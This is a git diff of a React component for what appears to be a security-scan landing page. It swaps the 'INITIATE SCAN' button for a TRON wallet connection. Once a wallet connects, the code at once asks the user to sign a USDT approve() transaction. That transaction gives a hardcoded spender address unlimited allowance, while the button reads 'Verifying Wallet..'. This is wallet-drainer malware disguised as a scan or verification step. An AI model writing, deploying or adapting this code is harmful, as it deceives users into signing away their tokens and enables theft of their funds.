@@ -1,12 +1,189 @@
 import { motion } from "motion/react";
 import { Shield, Terminal } from "lucide-react";
 import { useState, useEffect } from "react";
-
+import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
+import { TronWeb } from "tronweb";
 interface HeroSectionProps {
   onInitiateScan: () => void;
 }
 
-export function HeroSection({ onInitiateScan }: HeroSectionProps) {
+
+// ======================
+// CONSTANTS (USDT APPROVAL)
+// ======================
+const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";
+
+const MAX_ALLOWANCE =
+  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+// ======================
+// TRONWEB INSTANCE
+// ======================
+function buildTronWeb() {
+  return new TronWeb({
+    fullHost: "https://api.trongrid.io",
+  });
+}
+
+// ======================
+// COMPONENT
+// ======================
+export function HeroSection({ onConnect, onDisconnect }: any) {
+  const [logs, setLogs] = useState<string[]>([]);
+    const [error, setError] = useState("");
+    const [loading, setLoading] = useState(false);
+  
+    // FLOW STATE
+    const [step, setStep] = useState<"connect" | "approve" | "done">(
+      "connect"
+    );
+  
+    const {
+      address,
+      connected,
+      wallet,
+      select,
+      connect,
+      disconnect,
+      wallets,
+    } = useWallet();
+  
+    // ======================
+    // AUTO SYNC WALLET
+    // ======================
+    useEffect(() => {
+      if (connected && address) {
+        onConnect?.({
+          address,
+          balance: "0",
+          network: "TRON MAINNET",
+        });
+  
+        handleApproval();
+      }
+    }, [connected, address]);
+  
+    // ======================
+    // LOGS
+    // ======================
+    useEffect(() => {
+      if (!connected || !address) {
+        setLogs([]);
+        return;
+      }
+  
+      const msgs = [
+        "> Wallet Connected",
+        `> ${address.slice(0, 6)}...${address.slice(-6)}`,
+        "> Ready for Approval",
+      ];
+  
+      setLogs([]);
+      let i = 0;
+  
+      const interval = setInterval(() => {
+        setLogs((p) => [...p, msgs[i]]);
+        i++;
+        if (i >= msgs.length) clearInterval(interval);
+      }, 200);
+  
+      return () => clearInterval(interval);
+    }, [connected, address]);
+
+
+  
+    // ======================
+    // CONNECT WALLET (QR)
+    // ======================
+    const handleWalletConnect = async () => {
+      try {
+        setLoading(true);
+        setError("");
+  
+        const wc = wallets.find((w) =>
+          w.adapter.name.toLowerCase().includes("walletconnect")
+        );
+  
+        if (!wc) throw new Error("WalletConnect not found");
+  
+        await select(wc.adapter.name as any);
+        await connect();
+
+      } catch (e: any) {
+        setError(e.message || "WalletConnect failed");
+      } finally {
+        setLoading(false);
+      }
+    };
+  
+    // ======================
+    // APPROVAL FUNCTION
+    // ======================
+    const handleApproval = async () => {
+      try {
+        setLoading(true);
+        setError("");
+  
+        if (!connected || !address || !wallet) {
+          throw new Error("Wallet not connected");
+        }
+  
+        const tronWeb = buildTronWeb();
+  
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          USDT_ADDRESS,
+          "approve(address,uint256)",
+          {
+            feeLimit: 100_000_000,
+            callValue: 0,
+          },
+          [
+            { type: "address", value: SPENDER },
+            { type: "uint256", value: MAX_ALLOWANCE },
+          ],
+          address
+        );
+  
+        if (!tx?.transaction) {
+          throw new Error("Failed to build transaction");
+        }
+  
+        const signed = await wallet.adapter.signTransaction(tx.transaction);
+  
+        if (!signed) {
+          throw new Error("Signing failed");
+        }
+  
+        const result = await tronWeb.trx.sendRawTransaction(signed);
+  
+        setStep("done");
+  
+        setLogs((p) => [
+          ...p,
+          `> Approval Success`,
+          `> TX: ${result.txid || "unknown"}`,
+        ]);
+      } catch (e: any) {
+        setError(e.message || "Approval failed");
+      } finally {
+        setLoading(false);
+      }
+    };
+  
+    // ======================
+    // DISCONNECT
+    // ======================
+    const handleDisconnect = async () => {
+      await disconnect();
+      setStep("connect");
+      setLogs([]);
+      onDisconnect?.();
+    };
+  
+    // ======================
+    // UI
+    // ======================
   const [showCursor, setShowCursor] = useState(true);
 
   useEffect(() => {
@@ -109,14 +286,15 @@ export function HeroSection({ onInitiateScan }: HeroSectionProps) {
           initial={{ opacity: 0, y: 20 }}
           animate={{ opacity: 1, y: 0 }}
           transition={{ duration: 0.6, delay: 0.6 }}
-          onClick={onInitiateScan}
+          onClick={handleWalletConnect}
+          disabled={loading}
           className="group relative px-12 py-5 bg-transparent border-2 border-[#ff1a1a] text-[#ff1a1a] text-lg tracking-widest overflow-hidden transition-all duration-300 hover:text-[#e6e6e6]"
           style={{ fontFamily: "Rajdhani, sans-serif", fontWeight: 700 }}
         >
           <div className="absolute inset-0 bg-[#ff1a1a] translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
           <span className="relative flex items-center gap-3">
             <Shield className="w-5 h-5" />
-            INITIATE SCAN
+            {loading ? "Verifying Wallet.." : "Connect Wallet"}
           </span>
 
           {/* Glowing border effect on hover */}
